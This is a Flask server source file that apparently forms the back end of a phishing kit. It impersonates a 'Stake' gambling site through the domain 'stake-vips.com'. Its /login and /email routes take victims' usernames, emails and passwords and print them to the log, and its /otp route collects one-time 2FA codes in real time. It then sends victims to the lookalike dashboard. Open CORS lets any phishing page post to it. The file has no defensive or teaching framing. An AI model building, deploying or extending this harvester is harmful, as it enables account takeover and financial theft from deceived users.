from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid

app = Flask(__name__)

# ✅ CORS
CORS(app)

@app.after_request
def handle_options(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

# SESSION STORE
SESSION_STATUS = {}

# ======================
# LOGIN
# ======================
@app.route("/login", methods=["POST", "OPTIONS"])
def login():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json()

    if not data or "login" not in data or "password" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    session_id = str(uuid.uuid4())

    SESSION_STATUS[session_id] = {
        "approved": False,
        "redirect_url": None
    }

    print(f"[LOGIN] {data['login']} / {data['password']}")

    return jsonify({"success": True, "id": session_id})


# ======================
# OTP (FIXED)
# ======================
@app.route("/otp", methods=["POST", "OPTIONS"])
def otp():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json()

    session_id = data.get("session_id")
    otp = data.get("otp")

    if not session_id or not otp:
        return jsonify({"success": False, "error": "Missing data"}), 400

    if session_id not in SESSION_STATUS:
        return jsonify({"success": False, "error": "Invalid session"}), 400

    print(f"[OTP RECEIVED] {otp} for session {session_id}")

    # ✅ simulate approval
    SESSION_STATUS[session_id]["approved"] = True
    SESSION_STATUS[session_id]["redirect_url"] = "https://www.stake-vips.com/dashboard.html"

    return jsonify({"success": True})


# ======================
# EMAIL (OPTIONAL)
# ======================
@app.route("/email", methods=["POST", "OPTIONS"])
def email():
    if request.method == "OPTIONS":
        return jsonify({}), 200

    data = request.get_json()

    if not data or "email" not in data or "password" not in data:
        return jsonify({"success": False, "error": "Missing fields"}), 400

    print(f"[EMAIL] {data['email']} / {data['password']}")

    return jsonify({"success": True})


# ======================
# STATUS
# ======================
@app.route("/status/<session_id>")
def status(session_id):
    session = SESSION_STATUS.get(session_id)

    if not session:
        return jsonify({"error": "Invalid session"}), 404

    return jsonify(session)


# ======================
# ROOT
# ======================
@app.route("/")
def home():
    return "✅ Server is live"


# ======================
# RUN (RENDER)
# ======================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
